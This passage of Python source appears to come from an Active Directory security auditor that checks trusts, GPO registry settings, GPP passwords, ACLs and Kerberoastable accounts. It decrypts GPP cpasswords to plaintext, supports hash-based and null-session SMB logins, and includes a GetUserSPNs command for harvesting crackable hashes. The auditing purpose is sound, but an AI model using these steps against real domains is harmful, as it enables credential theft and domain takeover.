        # INTO this domain; without SID filtering that enables SID-history injection.
        if tdir in (TRUST_DIR_INBOUND, TRUST_DIR_BIDIRECT):
            if not (attrs & TRUST_ATTR_QUARANTINED):
                if not (attrs & TRUST_ATTR_WITHIN_FOREST):
                    self._add("T-SIDFiltering",
                              f"SID filtering (quarantine) is NOT enabled on trust with "
                              f"'{name}'. SID history abuse may allow cross-trust escalation.",
                              [name])

        # TGT delegation
        if attrs & TRUST_ATTR_TGT_DELEGATION:
            self._add("T-TGTDelegation",
                      f"TGT delegation is enabled on trust with '{name}'. "
                      "Compromising a resource in the trusted domain can lead to "
                      "full cross-domain compromise.",
                      [name])

        # SID history dangerous
        # Check if any accounts with sIDHistory have SIDs from trusted domain
        trust_sid = trust["attrs"].get("securityIdentifier")
        if trust_sid:
            trust_sid_str = sid_to_str(trust_sid)
            for obj in self.d.users + self.d.computers:
                sids = get_list(obj["attrs"], "sIDHistory")
                for sid in sids:
                    sid_s = sid_to_str(sid) if isinstance(sid, bytes) else str(sid)
                    if trust_sid_str and sid_s.startswith(trust_sid_str + "-"):
                        sam = get_str(obj["attrs"], "sAMAccountName")
                        self._add("T-SIDHistoryDangerous",
                                  f"Object '{sam}' has SID history containing a SID from "
                                  f"trusted domain '{name}'. Cross-trust privilege escalation risk.",
                                  [sam, name])

    def _t_azure_ad_sso(self):
        # AZUREADSSOACC$ account = Azure AD Seamless SSO
        sso_acct = self.d.conn.search_one(
            self.d.base,
            "(sAMAccountName=AZUREADSSOACC$)",
            ["sAMAccountName","pwdLastSet","whenCreated","distinguishedName"])
        if sso_acct:
            pls = filetime_to_dt(get_int(sso_acct["attrs"], "pwdLastSet"))
            age = days_since(pls)
            if age is None or age > 180:
                age_str = f"{age} days" if age is not None else "NEVER"
                self._add("T-AzureADSSO",
                          f"AZUREADSSOACC$ account found (Azure AD Seamless SSO). "
                          f"Password last changed {age_str} ago. "
                          "This account should have its password rotated every 30-60 days. "
                          "Compromise allows forging Kerberos tickets for any synced user.",
                          ["AZUREADSSOACC$"])

    # =========================================================================
    # GPO / SYSVOL CHECKS  (populated after SYSVOLChecker runs)
    # =========================================================================

    def _check_gpo_sysvol(self):
        # Presence-based checks (only fire on an actual bad value found in SYSVOL)
        # are always safe to run.
        self._p_gpp_passwords()
        self._a_wdigest()
        self._a_lm_compat()
        self._a_wsus_http_gpo()
        self._a_dsrm_logon()
        # Absence-based checks ("not configured via GPO") MUST NOT run if SYSVOL
        # could not be read — otherwise every setting looks unconfigured and we
        # emit false positives. Only run them when SYSVOL was actually scanned.
        if not self.d.sysvol_scanned:
            if not self.args.no_smb:
                print("[!] SYSVOL not readable — skipping GPO 'not configured' "
                      "checks (LLMNR/NBT-NS/CredGuard/UNC paths/PowerShell/NTLM) "
                      "to avoid false positives.")
            return
        self._a_llmnr()
        self._a_nbtns()
        self._a_credential_guard_gpo()
        self._a_hardened_paths_gpo()
        self._a_powershell_logging_gpo()
        self._a_restrict_remote_sam()
        self._a_ntlm_audit()

    # ── RestrictRemoteSAM / NTLM audit / DSRM logon (GPO security options) ─────

    def _a_restrict_remote_sam(self):
        if not self.d.sysvol_data.get("registry_pol") and not self.d.sysvol_data.get("inf_settings"):
            return  # SYSVOL not scanned — avoid false "not configured"
        raw = self._get_reg_value("Control\\Lsa", "RestrictRemoteSAM")
        inf = self._get_inf_value("Registry Values",
            "MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\RestrictRemoteSAM")
        if raw is None and inf is None:
            self._add("A-RestrictRemoteSAM",
                      "No GPO sets 'Network access: Restrict clients allowed to make "
                      "remote calls to SAM' (RestrictRemoteSAM). Unauthenticated/low-"
                      "priv SAMR enumeration of local groups and users remains "
                      "possible (net rpc, SharpHound). Set an SDDL allowing only "
                      "Administrators.")

    def _a_ntlm_audit(self):
        if not self.d.sysvol_data.get("registry_pol"):
            return
        recv = self._get_reg_dword("Lsa\\MSV1_0", "AuditReceivingNTLMTraffic")
        out  = self._get_reg_dword("Lsa\\MSV1_0", "RestrictSendingNTLMTraffic")
        if (recv in (None, 0)) and (out in (None, 0)):
            self._add("A-NTLMAudit",
                      "NTLM auditing is not enabled via GPO (AuditReceivingNTLM"
                      "Traffic / RestrictSendingNTLMTraffic unset). Without it you "
                      "cannot baseline NTLM usage prior to disabling it, and relay "
                      "attacks go unlogged. Enable auditing as a precursor to "
                      "restricting NTLM.")

    def _a_dsrm_logon(self):
        val = self._get_reg_dword("Control\\Lsa", "DsrmAdminLogonBehavior")
        if val == 2:
            self._add("A-DSRMLogon",
                      "DsrmAdminLogonBehavior=2 — the Directory Services Restore "
                      "Mode local administrator can log on over the network while "
                      "the DC is running. Combined with a known/recovered DSRM hash "
                      "this is a stealth domain-controller backdoor. Set to 0.",
                      ["DsrmAdminLogonBehavior=2"])

    # ── helpers ───────────────────────────────────────────────────────────────

    def _get_reg_value(self, key_fragment: str, val_name: str) -> Optional[bytes]:
        """Search registry_pol entries for the first matching key/value."""
        for entry in self.d.sysvol_data.get("registry_pol", []):
            if (key_fragment.lower() in entry["key"].lower()
                    and entry["name"].lower() == val_name.lower()):
                return entry["raw"]
        return None

    def _get_reg_dword(self, key_fragment: str, val_name: str) -> Optional[int]:
        raw = self._get_reg_value(key_fragment, val_name)
        if raw is not None:
            return _reg_dword(raw)
        return None

    def _get_inf_value(self, section: str, key: str) -> Optional[str]:
        """Search GptTmpl.inf settings."""
        for entry in self.d.sysvol_data.get("inf_settings", []):
            if (entry["section"].lower() == section.lower()
                    and entry["key"].lower() == key.lower()):
                return entry["value"]
        return None

    # ── GPP passwords ─────────────────────────────────────────────────────────

    def _p_gpp_passwords(self):
        passwords = self.d.sysvol_data.get("gpp_passwords", [])
        if not passwords:
            return
        for pw in passwords:
            name     = pw.get("username") or "unknown"
            gpo_name = pw.get("gpo_name", "")
            fname    = pw.get("file", "")
            plain    = pw.get("plaintext", "")
            self._add("P-GPPPassword",
                      f"GPP cpassword found in GPO '{gpo_name}', file '{fname}'. "
                      f"Username: {name}. Decrypted password: {plain}. "
                      "MS14-025: AES key is public knowledge — treat as plaintext.",
                      [name, gpo_name])

    # ── WDigest ───────────────────────────────────────────────────────────────

    def _a_wdigest(self):
        val = self._get_reg_dword(
            "Control\\SecurityProviders\\WDigest", "UseLogonCredential")
        if val == 1:
            self._add("A-WDigest",
                      "Registry.pol sets HKLM\\SYSTEM\\CurrentControlSet\\Control\\"
                      "SecurityProviders\\WDigest\\UseLogonCredential=1. "
                      "Cleartext credentials cached in LSASS memory — "
                      "trivially harvested by Mimikatz. Disable immediately.")

    # ── LM Compatibility Level ─────────────────────────────────────────────────

    def _a_lm_compat(self):
        # Check Registry.pol first
        val = self._get_reg_dword(
            "Lsa", "LmCompatibilityLevel")
        if val is None:
            # Also check GptTmpl.inf [System Access] / [Registry Values]
            inf_val = self._get_inf_value("Registry Values",
                "MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel")
            if inf_val is not None:
                try:
                    val = int(inf_val.split(",")[-1].strip())
                except ValueError:
                    pass
        if val is not None and val < 3:
            self._add("A-LMCompatibilityLevel",
                      f"LmCompatibilityLevel is {val} (NTLMv1 permitted). "
                      "Recommended value is 5 (NTLMv2 only, refuse LM/NTLMv1). "
                      "NTLMv1 hashes are trivially cracked or relayed (e.g. Responder).",
                      [f"LmCompatibilityLevel={val}"])
        # If `val is None` (not configured), keep silent. The default behavior
        # on supported OS versions is NTLMv2-only — flagging absence here was
        # responsible for false-positive noise on healthy domains.

    # ── LLMNR ─────────────────────────────────────────────────────────────────

    def _a_llmnr(self):
        val = self._get_reg_dword(
            "DNSClient", "EnableMulticast")
        if val is None or val != 0:
            val_str = str(val) if val is not None else "not configured"
            self._add("A-LLMNR",
                      f"LLMNR (Link-Local Multicast Name Resolution) EnableMulticast={val_str}. "
                      "LLMNR not disabled allows Responder-style MITM credential capture. "
                      "Set HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\\"
                      "EnableMulticast=0 via GPO.")

    # ── NetBIOS Name Service ──────────────────────────────────────────────────

    def _a_nbtns(self):
        val = self._get_reg_dword(
            "NetBT\\Parameters", "NodeType")
        if val is None or val not in (2, 4):
            # NodeType=2 = P-node (no broadcast), 4=M-node but broadcast last
            # Recommended: NodeType=2 or disable NetBIOS via DHCP
            val_str = str(val) if val is not None else "not configured"
            self._add("A-NBTNSDisabled",
                      f"NetBT NodeType={val_str} (NetBIOS Name Service may be active). "
                      "NBT-NS poisoning via Responder allows credential theft. "
                      "Set NodeType=2 (P-node/no broadcast) or disable via NIC settings.")

    # ── Credential Guard ──────────────────────────────────────────────────────

    def _a_credential_guard_gpo(self):
        val = self._get_reg_dword(
            "DeviceGuard", "LsaCfgFlags")
        if val is None or val == 0:
            val_str = str(val) if val is not None else "not configured"
            self._add("A-CredentialGuard",
                      f"Credential Guard LsaCfgFlags={val_str} (not enforced). "
                      "Credential Guard prevents LSASS credential dumping on supported hardware. "
                      "Set HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard\\"
                      "LsaCfgFlags=1 via GPO for all DCs and servers.")

    # ── UNC Hardened Paths ────────────────────────────────────────────────────

    def _a_hardened_paths_gpo(self):
        # Check for SYSVOL and NETLOGON hardened paths
        sysvol_hardened  = self._get_reg_value("NetworkProvider\\HardenedPaths", "\\\\*\\SYSVOL")
        netlogon_hardened = self._get_reg_value("NetworkProvider\\HardenedPaths", "\\\\*\\NETLOGON")
        missing = []
        if sysvol_hardened is None:
            missing.append("\\\\*\\SYSVOL")
        if netlogon_hardened is None:
            missing.append("\\\\*\\NETLOGON")
        if missing:
            self._add("A-HardenedPaths",
                      f"UNC hardened paths not configured for: {', '.join(missing)}. "
                      "Without UNC hardening, a MITM attacker can redirect SYSVOL/NETLOGON "
                      "traffic to harvest NTLMv2 hashes or deliver malicious scripts. "
                      "Configure RequireMutualAuthentication=1,RequireIntegrity=1.")

    # ── PowerShell Script Block Logging ──────────────────────────────────────

    def _a_powershell_logging_gpo(self):
        sbl = self._get_reg_dword(
            "PowerShell\\ScriptBlockLogging", "EnableScriptBlockLogging")
        transcription = self._get_reg_dword(
            "PowerShell\\Transcription", "EnableTranscripting")
        if sbl != 1:
            self._add("A-PowerShellLogging",
                      f"PowerShell Script Block Logging not enabled (value={sbl}). "
                      "Attackers can run arbitrary PS code without audit trail. "
                      "Enable via: Computer Config > Admin Templates > PowerShell.")
        if transcription != 1:
            self._add("A-PowerShellTranscript",
                      f"PowerShell Transcription logging not enabled (value={transcription}). "
                      "Transcription captures all commands and output to text files. "
                      "Complement to script block logging for forensic investigation.")

    # ── WSUS HTTP ─────────────────────────────────────────────────────────────

    def _a_wsus_http_gpo(self):
        val = self._get_reg_value("WindowsUpdate\\AU", "WUServer")
        if val is not None:
            url = _reg_sz(val)
            if url.lower().startswith("http://"):
                self._add("A-WSUS-HTTP",
                          f"WSUS WUServer URL is HTTP: {url}. "
                          "HTTP WSUS allows MITM update injection to gain SYSTEM on any patching client. "
                          "Switch to HTTPS and enable SSL certificate validation.")

    # =========================================================================
    # ACL CHECKS  (populated after ACLAnalyzer runs)
    # =========================================================================

    def _check_acl(self):
        self._p_dcsync_rights()
        self._p_dangerous_acl_domain()
        self._p_dangerous_acl_priv_groups()
        self._p_modifiable_gpo()
        self._p_machine_account_quota()

    def _p_dcsync_rights(self):
        dcsync = [f for f in self.d.acl_findings if f.get("type") == "dcsync"]
        if dcsync:
            for f in dcsync:
                self._add("P-DCSync",
                          f"{f['sid_name']} ({f['sid']}) has {f['right']} on {f['object']}. "
                          "This extended right allows replication of all AD secrets including "
                          "NTLM hashes and Kerberos keys — equivalent to domain compromise. "
                          "Remove immediately; only Domain Controllers should hold this right.",
                          [f['sid_name'], f['object']])

    def _p_dangerous_acl_domain(self):
        dangerous = [f for f in self.d.acl_findings
                     if f.get("type") in ("dangerous_acl", "owner", "write_property")
                     and "domain" in f.get("object","").lower()]
        if dangerous:
            for f in dangerous:
                self._add("P-DangerousACLDomain",
                          f"{f['sid_name']} ({f['sid']}) has {f['right']} on {f['object']}. "
                          "This allows the principal to change permissions, take ownership, "
                          "or modify all properties on the domain root — full domain compromise path.",
                          [f['sid_name'], f['object']])

    def _p_dangerous_acl_priv_groups(self):
        group_findings = [f for f in self.d.acl_findings
                          if f.get("type") in ("dangerous_acl", "owner", "write_property")
                          and any(g in f.get("object","")
                                  for g in ("Domain Admins","Enterprise Admins",
                                            "Schema Admins","AdminSDHolder"))]
        if group_findings:
            for f in group_findings:
                self._add("P-WriteToPrivGroup",
                          f"{f['sid_name']} ({f['sid']}) has {f['right']} on {f['object']}. "
                          "Allows adding arbitrary users to the most privileged groups. "
                          "Remove non-admin write access from this group's ACL.",
                          [f['sid_name'], f['object']])

    def _p_modifiable_gpo(self):
        gpo_write = [f for f in self.d.acl_findings if f.get("type") == "gpo_write"]
        seen = set()
        for f in gpo_write:
            key = (f["sid_name"], f["object"])
            if key in seen:
                continue
            seen.add(key)
            self._add("P-ModifiableGPO",
                      f"{f['sid_name']} ({f['sid']}) can modify GPO '{f['object']}'. "
                      "Attacker controlling this principal can edit GPO content to execute "
                      "arbitrary code on all computers/users in the GPO scope.",
                      [f['sid_name'], f['object']])

    def _p_machine_account_quota(self):
        maq = self.d.machine_account_quota
        if maq > 0:
            self._add("P-MachineAccountQuota",
                      f"ms-DS-MachineAccountQuota = {maq}. Any authenticated domain user can "
                      f"create up to {maq} machine accounts. Combined with RBCD or Shadow "
                      "Credentials attacks this enables escalation to Domain Admin. "
                      "Set to 0: Set-ADDomain -MachineAccountQuota 0",
                      [f"MachineAccountQuota={maq}"])

    # =========================================================================
    # EXTRA CHECKS (kerberoastable accounts, etc.)
    # =========================================================================

    def _check_extra(self):
        self._s_kerberoastable_all()

    def _s_kerberoastable_all(self):
        """Flag all kerberoastable accounts, not just admins."""
        admin_sams = set()
        for grp_name, members in self.d.priv_group_members.items():
            for m in members:
                # members are {dn, attrs} dicts
                sam = get_str(m.get("attrs", {}), "sAMAccountName") if isinstance(m, dict) else str(m)
                if sam:
                    admin_sams.add(sam.lower())

        kerberoastable = []
        admin_kerberoastable = []
        for u in self.d.users:
            attrs = u.get("attrs", {})
            uac = get_int(attrs, "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            spns = get_list(attrs, "servicePrincipalName")
            if not spns:
                continue
            sam = get_str(attrs, "sAMAccountName")
            enc_types = get_int(attrs, "msDS-SupportedEncryptionTypes")
            # Flag RC4-only or unset (defaults to RC4) as weak
            has_aes = enc_types & 0x18  # bits 3-4 = AES128, AES256
            if not has_aes:
                kerberoastable.append(sam)
                if sam.lower() in admin_sams:
                    admin_kerberoastable.append(sam)

        if admin_kerberoastable:
            self._add("S-KerberoastableAdmin",
                      f"{len(admin_kerberoastable)} admin account(s) with SPNs and "
                      "no AES encryption types — Kerberoastable with RC4 tickets. "
                      "RC4 TGS tickets can be offline-cracked in hours on commodity hardware. "
                      "Set AES256/AES128 encryption types and use strong passwords (>25 chars).",
                      admin_kerberoastable[:20])
        elif kerberoastable:
            self._add("S-Kerberoastable",
                      f"{len(kerberoastable)} account(s) with SPNs and no AES encryption "
                      "types — Kerberoastable with RC4. "
                      "Run: GetUserSPNs.py domain/user -request to harvest crackable hashes. "
                      "Enforce msDS-SupportedEncryptionTypes to include AES256.",
                      kerberoastable[:20])


# ─────────────────────────────────────────────────────────────────────────────
# GPP PASSWORD DECRYPTION
# ─────────────────────────────────────────────────────────────────────────────

# Microsoft published AES key for GPP password decryption (MS-GPPREF §2.2.1.1.4)
_GPP_AES_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)

def decrypt_gpp_cpassword(cpassword: str) -> str:
    """Decrypt a GPP cpassword value using the published Microsoft AES key."""
    if not HAS_PYCRYPTO:
        return "<pycryptodome not installed>"
    try:
        # Pad to multiple of 4 for base64
        padded = cpassword + "=" * (4 - len(cpassword) % 4) if len(cpassword) % 4 else cpassword
        data = base64.b64decode(padded)
        iv   = b"\x00" * 16
        cipher = AES.new(_GPP_AES_KEY, AES.MODE_CBC, iv)
        dec = cipher.decrypt(data)
        # Strip PKCS7 padding and decode UTF-16LE
        pad = dec[-1]
        if isinstance(pad, int) and 1 <= pad <= 16:
            dec = dec[:-pad]
        return dec.decode("utf-16-le", errors="replace").rstrip("\x00")
    except Exception as e:
        return f"<decryption failed: {e}>"


# ─────────────────────────────────────────────────────────────────────────────
# Registry.pol PARSER
# ─────────────────────────────────────────────────────────────────────────────

_PREG_MAGIC = b"PReg\x01\x00\x00\x00"

def parse_registry_pol(data: bytes) -> List[Tuple[str, str, int, bytes]]:
    """Parse a Registry.pol file into (key, name, regtype, rawdata) tuples."""
    results = []
    if not data.startswith(_PREG_MAGIC):
        return results
    pos = 8  # skip header
    length = len(data)
    while pos < length - 4:
        # Each entry: [key\0][value\0][type][size][data]
        # delimited by [;] (0x3b 0x00 in UTF-16LE)
        try:
            if data[pos:pos+2] != b"\x5b\x00":  # '['
                pos += 2
                continue
            pos += 2  # skip '['

            def read_wstr(p):
                end = p
                while end < length - 1:
                    if data[end:end+2] == b"\x00\x00":
                        break
                    end += 2
                s = data[p:end].decode("utf-16-le", errors="replace")
                return s, end + 2  # skip null terminator

            key,   pos = read_wstr(pos)
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            name,  pos = read_wstr(pos)
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            if pos + 4 > length:
                break
            regtype = struct.unpack_from("<I", data, pos)[0]
            pos += 4
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            if pos + 4 > length:
                break
            size = struct.unpack_from("<I", data, pos)[0]
            pos += 4
            if pos < length - 1 and data[pos:pos+2] == b"\x3b\x00":
                pos += 2
            rawdata = data[pos:pos+size]
            pos += size
            if pos < length - 1 and data[pos:pos+2] == b"\x5d\x00":
                pos += 2
            results.append((key, name, regtype, rawdata))
        except Exception:
            pos += 2
    return results


def _reg_dword(rawdata: bytes) -> Optional[int]:
    if len(rawdata) >= 4:
        return struct.unpack_from("<I", rawdata)[0]
    return None


def _reg_sz(rawdata: bytes) -> str:
    try:
        return rawdata.decode("utf-16-le", errors="replace").rstrip("\x00")
    except Exception:
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# SYSVOL CHECKER
# ─────────────────────────────────────────────────────────────────────────────

class SYSVOLChecker:
    """Connects to SYSVOL via SMB and collects GPO security settings."""

    _GPP_FILES = {
        "Groups.xml", "Services.xml", "Scheduledtasks.xml",
        "DataSources.xml", "Printers.xml", "Drives.xml",
    }

    def __init__(self, args, data: "ADData"):
        self.args   = args
        self.data   = data
        self.smb: Optional["SMBConnection"] = None

    def run(self):
        if not HAS_IMPACKET_SMB:
            print("[!] impacket not available — skipping SYSVOL checks")
            return
        print("[*] Connecting to SYSVOL...")
        try:
            self._connect()
        except Exception as e:
            print(f"[!] SYSVOL connection failed: {e}")
            return
        try:
            self._walk_sysvol()
            self.data.sysvol_scanned = True   # GPO-absence checks may now run
        except Exception as e:
            print(f"[!] SYSVOL walk failed: {e}")
        finally:
            try:
                self.smb.logoff()
            except Exception:
                pass

    def _connect(self):
        # For Kerberos the remoteName must be the DC FQDN so impacket builds a
        # valid cifs/<fqdn> SPN (an IP gives KDC_ERR_S_PRINCIPAL_UNKNOWN).
        remote_name = (self.args.dc_host or self.args.dc_ip) if self.args.kerberos else self.args.dc_ip
        self.smb = SMBConnection(remote_name, self.args.dc_ip, timeout=10)
        if self.args.kerberos:
            lm = nt = ""
            if self.args.hashes:
                lm, nt = self._split_hashes()
            # Reuse the ccache exported by ADConnection (KRB5CCNAME) when present,
            # otherwise mint a fresh SMB TGT from the supplied secret.
            self.smb.kerberosLogin(
                self.args.username or "", self.args.password or "",
                self.args.domain, lm, nt, self.args.aes_key or "",
                kdcHost=self.args.dc_ip,
                useCache=bool(os.environ.get("KRB5CCNAME")))
        elif self.args.hashes:
            lm, nt = self._split_hashes()
            self.smb.login(self.args.username or "", "", self.args.domain, lm, nt)
        elif self.args.null_session:
            self.smb.login("", "", "", "", "")
        else:
            self.smb.login(
                self.args.username or "", self.args.password or "",
                self.args.domain, "", "")

    def _split_hashes(self) -> Tuple[str, str]:
        h = self.args.hashes or ""
        if ":" in h:
            lm, nt = h.split(":", 1)
        else:
            lm, nt = "aad3b435b51404eeaad3b435b51404ee", h
        if len(lm) != 32:
            lm = "aad3b435b51404eeaad3b435b51404ee"
        return lm, nt

    def _walk_sysvol(self):
        domain = self.args.domain.upper()
        base_path = f"\\{domain}\\Policies\\"
        try:
            entries = self.smb.listPath("SYSVOL", base_path + "*")
        except Exception as e:
            print(f"[!] Cannot list SYSVOL Policies: {e}")
            return
        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            if not name.startswith("{"):
                continue
            gpo_guid = name
            gpo_name = self._gpo_display_name(gpo_guid)
            gpo_path = base_path + gpo_guid + "\\"
            self._scan_gpo(gpo_guid, gpo_name, gpo_path)

    def _gpo_display_name(self, guid: str) -> str:
        for gpo in self.data.gpos:
            dn_attr = gpo.get("dn", "")
            if guid.upper() in dn_attr.upper():
                return get_str(gpo["attrs"], "displayName") or guid
        return guid

    def _scan_gpo(self, guid: str, display_name: str, base_path: str):
        # Scan Registry.pol files
        for subpath in ["Machine\\Registry.pol", "User\\Registry.pol"]:
            full = base_path + subpath
            raw = self._read_file(full)
            if raw:
                self._parse_registry_pol(guid, display_name, full, raw)

        # Scan GptTmpl.inf
        inf_path = base_path + "Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf"
        raw = self._read_file(inf_path)
        if raw:
            self._parse_gpttmpl(guid, display_name, raw)

        # Scan GPP preference XML files
        for scope in ("Machine", "User"):
            for fname in self._GPP_FILES:
                subcat = fname.replace(".xml", "")
                full = base_path + f"{scope}\\Preferences\\{subcat}\\{fname}"
                raw = self._read_file(full)
                if raw:
                    self._parse_gpp_xml(guid, display_name, full, raw)

    def _read_file(self, path: str) -> Optional[bytes]:
        buf = io.BytesIO()
        try:
            self.smb.getFile("SYSVOL", path, buf.write)
            return buf.getvalue()
        except Exception:
            return None

    def _parse_registry_pol(self, guid: str, name: str, path: str, raw: bytes):
        entries = parse_registry_pol(raw)
        for key, valname, regtype, rawdata in entries:
            self.data.sysvol_data["registry_pol"].append({
                "gpo_guid":    guid,
                "gpo_name":    name,
                "path":        path,
                "key":         key,
                "name":        valname,
                "regtype":     regtype,
                "raw":         rawdata,
            })

    def _parse_gpttmpl(self, guid: str, name: str, raw: bytes):
        try:
            text = raw.decode("utf-16-le", errors="replace")
        except Exception:
            try:
                text = raw.decode("utf-8", errors="replace")
            except Exception:
                return
        section = ""
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith(";"):
                continue
            if line.startswith("[") and line.endswith("]"):
                section = line[1:-1].strip()
                continue
            if "=" in line:
                k, _, v = line.partition("=")
                self.data.sysvol_data["inf_settings"].append({
                    "gpo_guid": guid,
                    "gpo_name": name,
                    "section":  section,
                    "key":      k.strip(),
                    "value":    v.strip(),
                })

    def _parse_gpp_xml(self, guid: str, name: str, path: str, raw: bytes):
        try:
            text = raw.decode("utf-16-le", errors="replace")
        except Exception:
            try:
                text = raw.decode("utf-8", errors="replace")
            except Exception:
                return
        try:
            root = ET.fromstring(text)
        except ET.ParseError:
            return
        # Walk every element looking for cpassword attributes
        for elem in root.iter():
            cpass = elem.get("cpassword", "")
            if not cpass:
                continue
            username  = (elem.get("userName") or elem.get("runAs") or
                         elem.get("username") or "")
            newname   = elem.get("newName", "")
            plaintext = decrypt_gpp_cpassword(cpass)
            self.data.sysvol_data["gpp_passwords"].append({
                "gpo_guid":  guid,
                "gpo_name":  name,
                "file":      path,
                "element":   elem.tag,
                "username":  username or newname,
                "cpassword": cpass,
                "plaintext": plaintext,
            })


# ─────────────────────────────────────────────────────────────────────────────
# ACL ANALYZER
# ─────────────────────────────────────────────────────────────────────────────

# Dangerous ACE masks
_ACE_WRITE_DAC       = 0x00040000
_ACE_WRITE_OWNER     = 0x00080000
_ACE_GENERIC_ALL     = 0x10000000
_ACE_GENERIC_WRITE   = 0x40000000
_ACE_DS_WRITE_PROP   = 0x00000020
_ACE_DS_CTRL_ACCESS  = 0x00000100
_ACE_DS_WRITE_MEMBER = 0x00000028  # WriteProperty on member attribute

# Well-known broad principal SIDs
_BROAD_SIDS = {
    "S-1-1-0":   "Everyone",
    "S-1-5-11":  "Authenticated Users",
    "S-1-5-7":   "Anonymous Logon",
    "S-1-5-4":   "Interactive",
}

# DCSync extended right GUIDs
_DCSYNC_GUIDS = {
    # DCSync needs Get-Changes (…aa) + Get-Changes-All (…ad). The "All" right is
    # …f6ad — NOT …f6ab (that GUID is DS-Replication-Synchronize, which is not a
    # DCSync primitive). The previous table had …f6ab here and would miss real
    # Get-Changes-All ACEs.
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
}


def _guid_from_bytes(b: bytes) -> str:
    """Format a little-endian GUID bytes to string."""
    if len(b) < 16:
        return ""
    p1 = struct.unpack_from("<IHH", b, 0)
    p2 = b[8:10]
    p3 = b[10:16]
    return "{%08x-%04x-%04x-%s-%s}" % (
        p1[0], p1[1], p1[2],
        p2.hex(), p3.hex()
    )

# impacket's *_OBJECT_ACE only carries ObjectType when the ACE_OBJECT_TYPE_PRESENT
# (0x1) flag is set, and the ldaptypes structures have NO .get() — a bare
# subscript KeyErrors and `.get()` AttributeErrors. Read it safely.
def _ace_object_type(ace_struct) -> bytes:
    """Return an object ACE's ObjectType GUID bytes, or b'' if not present."""
    try:
        if ace_struct["Flags"] & 0x01:   # ACE_OBJECT_TYPE_PRESENT
            return bytes(ace_struct["ObjectType"])
    except Exception:
        pass
    return b""


class ACLAnalyzer:
    """Fetches and analyzes DACLs on high-value AD objects for dangerous ACEs."""

    def __init__(self, conn: "ADConnection", data: "ADData", args):
        self.conn  = conn
        self.data  = data
        self.args  = args
        # broad SID set, expanded with domain-relative SIDs once we have domain_sid
        self._broad: Dict[str, str] = dict(_BROAD_SIDS)

    def run(self):
        if not HAS_IMPACKET_LDAP:
            print("[!] impacket not available — skipping ACL analysis")
            return
        print("[*] Analyzing ACLs on high-value objects...")
        self._build_broad_sids()
        # Domain root object
        self._check_object_acl(
            self.conn.base_dn, "Domain Root",
            check_dcsync=True, check_owner=True)
        # Domain Admins group
        da_dn = self._find_group_dn("Domain Admins")
        if da_dn:
            self._check_object_acl(da_dn, "Domain Admins", check_owner=True)
        # Enterprise Admins group
        ea_dn = self._find_group_dn("Enterprise Admins")
        if ea_dn:
            self._check_object_acl(ea_dn, "Enterprise Admins", check_owner=True)
        # Schema Admins group
        sa_dn = self._find_group_dn("Schema Admins")
        if sa_dn:
            self._check_object_acl(sa_dn, "Schema Admins")
        # AdminSDHolder
        ash_dn = f"CN=AdminSDHolder,CN=System,{self.conn.base_dn}"
        self._check_object_acl(ash_dn, "AdminSDHolder")
        # All GPO objects
        for gpo in self.data.gpos:
            dn = gpo.get("dn", "")
            display = get_str(gpo["attrs"], "displayName") or dn
            if dn:
                self._check_gpo_acl(dn, display)

    def _build_broad_sids(self):
        if self.data.domain_obj:
            raw_sid = self.data.domain_obj.get("attrs", {}).get("objectSid")
            if raw_sid:
                if isinstance(raw_sid, list):
                    raw_sid = raw_sid[0]
                domain_sid = self._raw_sid_to_str(raw_sid)
                if domain_sid:
                    self._broad[f"{domain_sid}-513"] = "Domain Users"
                    self._broad[f"{domain_sid}-515"] = "Domain Computers"

    def _raw_sid_to_str(self, raw) -> str:
        if isinstance(raw, (bytes, bytearray)):
            return sid_to_str(raw)
        return str(raw)

    def _find_group_dn(self, sam: str) -> Optional[str]:
        r = self.conn.search_one(
            self.conn.base_dn,
            f"(sAMAccountName={sam})",
            ["distinguishedName"])
        if r:
            return r.get("dn", "")
        return None

    def _fetch_sd(self, dn: str) -> Optional[bytes]:
        # Delegate to the backend-agnostic reader on ADConnection (the fixed
        # SD-control logic lives in one place now).
        return self.conn.fetch_sd(dn)

    def _parse_dacl(self, raw_sd: bytes):
        try:
            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd.fromString(raw_sd)
            return sd
        except Exception:
            return None

    def _sid_str(self, ace_sid) -> str:
        try:
            return ace_sid.formatCanonical()
        except Exception:
            try:
                return str(ace_sid)
            except Exception:
                return ""

    def _check_object_acl(self, dn: str, label: str,
                           check_dcsync: bool = False,
                           check_owner: bool = False):
        raw_sd = self._fetch_sd(dn)
        if not raw_sd:
            return
        sd = self._parse_dacl(raw_sd)
        if not sd:
            return

        # Check owner
        if check_owner and sd["OwnerSid"]:
            owner_sid = self._sid_str(sd["OwnerSid"])
            owner_name = self._broad.get(owner_sid)
            if owner_name:
                self.data.acl_findings.append({
                    "type":    "owner",
                    "object":  label,
                    "dn":      dn,
                    "sid":     owner_sid,
                    "sid_name": owner_name,
                    "right":   "OWNER",
                    "detail":  f"{owner_name} owns {label}",
                })

        # Check DACL
        dacl = sd["Dacl"]
        if not dacl:
            return
        for ace in dacl["Data"]:
            try:
                ace_type = ace["TypeName"]
                if "DENIED" in ace_type.upper():
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                sid_str_val = self._sid_str(ace["Ace"]["Sid"])
                principal_name = self._broad.get(sid_str_val)
                if not principal_name:
                    continue  # not a broad principal

                # DCSync rights
                if check_dcsync and "OBJECT" in ace_type.upper():
